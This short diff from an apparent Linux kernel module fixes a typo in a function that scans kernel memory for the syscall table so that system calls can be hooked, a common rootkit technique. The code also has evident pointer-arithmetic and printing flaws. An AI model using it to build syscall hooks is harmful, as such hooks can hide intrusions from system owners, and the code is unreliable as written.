@@ -112,7 +112,7 @@ int hook_syscall(hook_s* hooks,unsigned int count){
 
 long unsigned int* lookup_syscall_table(void){
     long unsigned int* table = PAGE_OFFSET;
-    long unsigned int* end = VMALLOC_START < UlLONG_MAX ? VMALLOC_START :ULLONG_MAX;
+    long unsigned int* end = VMALLOC_START < ULLONG_MAX ? VMALLOC_START :ULLONG_MAX;
     while(table != end && table + __NR_read * sizeof(long unsigned int*) < end){
         if(table[__NR_read] == (long unsigned int)sys_read){
             echo("sys_call_table address %p\n", sys_call_table);
